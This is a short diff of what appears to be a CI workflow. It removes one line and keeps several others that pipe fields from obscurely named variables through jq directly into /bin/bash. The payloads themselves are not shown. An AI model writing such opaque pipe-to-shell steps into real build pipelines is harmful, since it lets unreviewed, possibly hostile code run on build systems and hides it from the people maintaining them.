@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$raioi5174" | jq -r .wrxlr3520 | /bin/bash
           echo $x295 | jq -r .aomch3453 | /bin/bash
           echo $tfcs3 | jq -r .e19 | /bin/bash
-          echo $ak8845 | jq -r .qdxr7 | /bin/bash
 
       - name: Save archive
         if: always()
